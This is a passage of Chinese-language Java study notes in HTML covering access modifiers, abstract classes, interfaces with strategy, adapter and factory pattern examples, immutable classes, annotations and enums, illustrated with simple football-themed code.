operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Arrays</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 导入System类的所有静态字段和静态方法:</span><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre></li></ol><h3 id="方法">方法</h3><h3 id="可变参数">可变参数</h3><ol type="1"><li>当使用<code>可变参数</code>的时候，实际上是先创建了一个<code>数组</code>，该数组的大小就是可变参数的个数，然后将参数放入数组当中，再将数组传递给被调用的方法。</li></ol><h3 id="native-本地方法">native 本地方法</h3><ol type="1"><li><code>Java Native Interface (JNI)</code>标准就成为 Java平台的一部分，它允许 Java 代码和其他语言编写的代码进行交互</li><li>使用 Java与本地已编译的代码交互，通常会丧失平台<code>可移植性</code>，但是，有些情况下这样做是可以接受的，甚至是必须的，比如，使用一些旧的库，与<code>硬件、操作系统</code>进行交互，或者为了提高程序的<code>性能</code>。</li></ol><h3 id="访问权限修饰符">访问权限修饰符</h3><ol type="1"><li><code>默认访问权限</code>（包访问权限）：如果一个类的方法或变量被包访问权限修饰，也就意味着只能在同一个包中的其他类中显示地调用该类的方法或者变量，在不同包中的类中不能显式地调用该类的方法或变量。<code>private</code>：如果一个类的方法或者变量被 private修饰，那么这个类的方法或者变量只能在该类本身中被访问，在类外以及其他类中都不能显式的进行访问。<code>protected</code>：如果一个类的方法或者变量被 protected修饰，对于同一个包的类，这个类的方法或变量是可以被访问的。对于不同包的类，只有继承于该类的类才可以访问到该类的方法或者变量。<code>public</code>：被 public修饰的方法或者变量，在任何地方都是可见的。</li></ol><h3 id="代码初始化块">代码初始化块</h3><h3 id="抽象类">抽象类</h3><ol type="1"><li>抽象类是不能实例化的</li><li>如果一个类定义了一个或多个抽象方法，那么这个类必须是抽象类。</li><li>抽象类中既可以定义抽象方法，也可以定义普通方法</li></ol><h3 id="接口">接口</h3><ol type="1"><li><p>没有使用 <code>private</code>、<code>default</code> 或者<code>static</code>关键字修饰的方法是<strong>隐式抽象</strong>的，在编译的时候会自动加上<code>public abstract</code> 修饰符</p></li><li><p>需要定义一个类去<code>实现</code>接口</p></li><li><p>Java原则上只支持单一继承，但通过接口可以实现<code>多重继承</code>的目的。</p></li><li><p>多态</p><p>Circle 类实现了 Shape 接口，并重写了 <code>name()</code> 方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Circle</span> <span class="token keyword">implements</span> <span class="token class-name">Shape</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"圆"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Square 类也实现了 Shape 接口，并重写了 <code>name()</code> 方法。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">implements</span> <span class="token class-name">Shape</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"正方形"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>然后来看测试类。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Shape</span><span class="token punctuation">></span></span> shapes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Shape</span> circleShape <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Shape</span> squareShape <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>shapes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>circleShape<span class="token punctuation">)</span><span class="token punctuation">;</span>shapes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>squareShape<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Shape</span> shape <span class="token operator">:</span> shapes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>shape<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>接口的三种模式</p><ol type="1"><li><p><code>策略模式</code>的思想是，针对一组算法，将每一种算法封装到具有共同接口的实现类中，接口的设计者可以在不影响调用者的情况下对算法做出改变</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 接口：教练</span><span class="token keyword">interface</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 方法：防守</span>    <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 何塞·穆里尼奥</span><span class="token keyword">class</span> <span class="token class-name">Hesai</span> <span class="token keyword">implements</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"防守赢得冠军"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 德普·瓜迪奥拉</span><span class="token keyword">class</span> <span class="token class-name">Guatu</span> <span class="token keyword">implements</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"进攻就是最好的防守"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 参数为接口</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token class-name">Coach</span> coach<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        coach<span class="token punctuation">.</span><span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 为同一个方法传递不同的对象</span>        <span class="token function">defend</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Hesai</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">defend</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Guatu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>适配器模式</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 抽象类实现接口，并置空方法</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AdapterCoach</span> <span class="token keyword">implements</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 新类继承适配器</span><span class="token keyword">class</span> <span class="token class-name">Hesai</span> <span class="token keyword">extends</span> <span class="token class-name">AdapterCoach</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"防守赢得冠军"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Coach</span> coach <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hesai</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coach<span class="token punctuation">.</span><span class="token function">defend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>如果我们只需要对其中<strong>一个方法</strong>进行实现的话，就可以使用一个抽象类作为<strong>中间件</strong>，即适配器（AdapterCoach），用这个抽象类实现接口，并对抽象类中的方法<strong>置空</strong>（方法体只有一对花括号），这时候，新类就可以绕过接口，继承抽象类，我们就可以只对需要的方法进行覆盖，而不是接口中的所有方法</p></li><li><p>工厂模式</p><p>什么工厂生产什么，比如说宝马工厂生产宝马，奔驰工厂生产奔驰，A级学院毕业 A 级教练，C 级学院毕业 C 级教练。示例如下：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 教练</span><span class="token keyword">interface</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 教练学院</span><span class="token keyword">interface</span> <span class="token class-name">CoachFactory</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Coach</span> <span class="token function">createCoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// A级教练</span><span class="token keyword">class</span> <span class="token class-name">ACoach</span> <span class="token keyword">implements</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">command</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我是A级证书教练"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">// A级教练学院</span><span class="token keyword">class</span> <span class="token class-name">ACoachFactory</span> <span class="token keyword">implements</span> <span class="token class-name">CoachFactory</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Coach</span> <span class="token function">createCoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ACoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">// C级教练</span><span class="token keyword">class</span> <span class="token class-name">CCoach</span> <span class="token keyword">implements</span> <span class="token class-name">Coach</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">command</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我是C级证书教练"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">// C级教练学院</span><span class="token keyword">class</span> <span class="token class-name">CCoachFactory</span> <span class="token keyword">implements</span> <span class="token class-name">CoachFactory</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Coach</span> <span class="token function">createCoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CCoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token class-name">CoachFactory</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        factory<span class="token punctuation">.</span><span class="token function">createCoach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">command</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 对于一支球队来说，需要什么样的教练就去找什么样的学院</span>        <span class="token comment">// 学院会介绍球队对应水平的教练。</span>        <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ACoachFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CCoachFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol></li><li><p>抽象类是普通类与接口之间的一种中庸之道。</p><ol type="1"><li>接口与抽象类的不同之处在于：<ul><li>1、抽象类可以有方法体的方法，但接口没有（Java 8 以前）。</li><li>2、接口中的成员变量隐式为<code>static final</code>，但抽象类不是的。</li><li>3、一个类可以实现多个接口，但只能继承一个抽象类。</li><li>抽象类可以提供成员方法的实现细节，而接口中只能存在 public abstract方法；</li><li>抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 publicstatic final 类型的；</li><li>接口中不能含有静态代码块，而抽象类可以有静态代码块；</li></ul></li></ol></li><li><p>xx</p><ol type="1"><li>接口是隐式抽象的，所以声明时没有必要使用 <code>abstract</code>关键字；</li><li>接口的每个方法都是隐式抽象的，所以同样不需要使用<code>abstract</code> 关键字；</li><li>接口中的方法都是隐式 <code>public</code> 的。</li></ol></li><li><p>继承抽象类的子类和抽象类本身是一种 <code>is-a</code>的关系</p></li><li><p>抽象类是对整个类整体进行抽象，包括属性、行为，但是接口却是对<strong>类局部（</strong>行为）进行抽象。</p></li></ol><h3 id="内部类">内部类</h3><ol type="1"><li>内部类可以<strong>随心所欲</strong>地访问外部类的成员，但外部类想要访问内部类的成员，就不那么容易了，必须先创建一个成员内部类的<strong>对象</strong>，再通过这个对象来访问</li></ol><h3 id="封装继承和多态">封装、继承和多态</h3><ol type="1"><li>子类的构造过程必须调用其父类的构造方法：</li><li>子类的构造过程必须调用其父类的构造方法：</li></ol><h3 id="thissuper">this|super</h3><ol type="1"><li><p>不过，需要注意的是，<code>this()</code>必须放在构造方法的第一行</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InvokeParamConstrutor</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">InvokeParamConstrutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">InvokeParamConstrutor</span><span class="token punctuation">(</span><span class="token keyword">int</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">InvokeParamConstrutor</span> invokeConstrutor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokeParamConstrutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="final">final</h3><ol type="1"><li>如果一个类使用了 final 关键字修饰，那么它就无法被继承</li></ol><h3 id="instanceof">instanceof</h3><ol type="1"><li>对象、接口</li><li>父类：<code>object</code></li></ol><h3 id="不可变对象">不可变对象</h3><ol type="1"><li><p>一个类的对象在通过构造方法创建后如果状态不会再被改变，那么它就是一个不可变（immutable）类。它的所有成员变量的赋值仅在构造方法中完成，不会提供任何setter 方法供外部类去修改</p></li><li><p>为了保护状态的原子性、可见性、有序性，我们程序员可以说是竭尽所能。其中，synchronized（同步）关键字是最简单最入门的一种解决方案。</p><p>假如说类是不可变的，那么对象的状态就也是不可变的。这样的话，每次修改对象的状态，就会产生一个新的对象供不同的线程使用，我们程序员就不必再担心并发问题了。</p></li><li><p><code>字符串常量池</code>是 Java堆内存中一个特殊的存储区域，当创建一个 String对象时，假如此字符串在常量池中不存在，那么就创建一个；假如已经存在，就不会再创建了，而是直接引用已经存在的对象</p></li><li><p>因为字符串是不可变的，所以在它创建的时候，其<code>hashCode</code> 就被缓存了，因此非常适合作为哈希值（比如说作为HashMap 的键），多次调用只返回同一个值，来提高效率。</p></li><li><p>就像之前说的那样，如果对象的状态是可变的，那么在多线程环境下，就很容易造成不可预期的结果。而String 是不可变的，就可以在多个线程之间共享，不需要同步处理。</p></li></ol><h3 id="手撸一个不可变类">手撸一个不可变类</h3><ol type="1"><li><p>手撸一个不可变类</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Writer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="java注解">Java注解</h3><ol type="1"><li><p>注解的类型一共有 11 种，定义在 ElementType 枚举中。</p><p>1）<code>TYPE</code>：用于类、接口、注解、枚举</p><p>2）<code>FIELD</code>：用于字段（类的成员变量），或者枚举常量</p><p>3）<code>METHOD</code>：用于方法</p><p>4）<code>PARAMETER</code>：用于普通方法或者构造方法的参数</p><p>5）<code>CONSTRUCTOR</code>：用于构造方法</p><p>6）<code>LOCAL_VARIABLE</code>：用于变量</p><p>7）<code>ANNOTATION_TYPE</code>：用于注解</p><p>8）<code>PACKAGE</code>：用于包</p><p>9）<code>TYPE_PARAMETER</code>：用于泛型参数</p><p>10）<code>TYPE_USE</code>：用于声明语句、泛型或者强制转换语句中的类型</p><p>11）<code>MODULE</code>：用于模块</p></li><li><p>在Java中,编译时和运行时主要有以下区别:</p><p><code>编译时</code>:</p><ul><li>Java代码被编译成字节码的过程</li><li>进行语法检查、编译错误提示</li><li>对类型、方法、字段访问等进行静态检查</li><li>生成CLASS文件</li></ul><p><code>运行时</code>:</p><ul><li>JVM加载CLASS文件,解释执行字节码的过程</li><li>对未编译错误进行运行时异常检查</li><li>进行动态绑定、反射等机制的运行时检查</li><li>变量初始化,对象创建,语句执行等行为发生</li></ul><p><strong>主要区别</strong>:</p><ul><li>编译时进行静态检查,运行时进行动态检查</li><li>编译时可发现大部分错误,运行时可发现剩余错误</li><li>编译时无程序状态,运行时程序状态不断变化</li><li>编译时确定类型安全,运行时允许通过反射/代理绕过</li></ul></li><li><p>注解的生命周期有 3 种策略</p><p>1）<code>SOURCE</code>：在源文件中有效，被编译器丢弃。</p><p>2）<code>CLASS</code>：在编译器生成的字节码文件中有效，但在运行时会被处理类文件的JVM 丢弃。</p><p>3）<code>RUNTIME</code>：在运行时有效。这也是注解生命周期中最常用的一种策略，它允许程序通过反射的方式访问注解，并根据注解的定义执行相应的代码。</p></li></ol><h3 id="枚举">枚举</h3><ol type="1"><li><p>例</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">PlayerType</span> <span class="token punctuation">&#123;</span>    <span class="token constant">TENNIS</span><span class="token punctuation">,</span>    <span class="token constant">FOOTBALL</span><span class="token punctuation">,</span>    <span class="token constant">BASKETBALL</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>既然枚举是一种特殊的类，那它其实是可以定义在一个类的内部的，这样它的作用域就可以限定于这个外部类中使用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Player</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">PlayerType</span> type<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">PlayerType</span> <span class="token punctuation">&#123;</span>        <span class="token constant">TENNIS</span><span class="token punctuation">,</span>        <span class="token constant">FOOTBALL</span><span class="token punctuation">,</span>        <span class="token constant">BASKETBALL</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isBasketballPlayer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">PlayerType</span><span class="token punctuation">.</span><span class="token constant">BASKETBALL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">PlayerType</span> <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> type<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setType</span><span class="token punctuation">(</span><span class="token class-name">PlayerType</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>==</code>运算符比较的时候，如果两个对象都为null，并不会发生 <code>NullPointerException</code>，而<code>equals()</code> 方法则会。</p></li><li><p>另外，“==”运算符会在编译时进行检查，如果两侧的类型不匹配，会提示错误，而<code>equals()</code> 方法则不会。</p></li><li><p>枚举还可用于 switch 语句，和基本数据类型的用法一致</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">switch</span> <span class="token punctuation">(</span>playerType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token constant">TENNIS</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token string">"网球运动员费德勒"</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token constant">FOOTBALL</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token string">"足球运动员C罗"</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token constant">BASKETBALL</span><span class="token operator">:</span>        <span class="token keyword">return</span> <span class="token string">"篮球运动员詹姆斯"</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token constant">UNKNOWN</span><span class="token operator">:</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"未知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span>                <span class="token string">"运动员类型: "</span> <span class="token operator">+</span> playerType<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>如果枚举中需要包含更多信息的话，可以为其添加一些字段</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> <span class="token class-name">PlayerType</span> <span class="token punctuation">&#123;</span>    <span class="token function">TENNIS</span><span class="token punctuation">(</span><span class="token string">"网球"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">FOOTBALL</span><span class="token punctuation">(</span><span class="token string">"足球"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">BASKETBALL</span><span class="token punctuation">(</span><span class="token string">"篮球"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token class-name">PlayerType</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><code>EnumSet</code> 是一个专门针对枚举类型的 Set接口（后面会讲）的实现类，它是处理枚举类型数据的一把利器，非常高效</p></li><li><p>因为 EnumSet 是一个<code>抽象类</code>，所以创建 EnumSet时不能使用 new 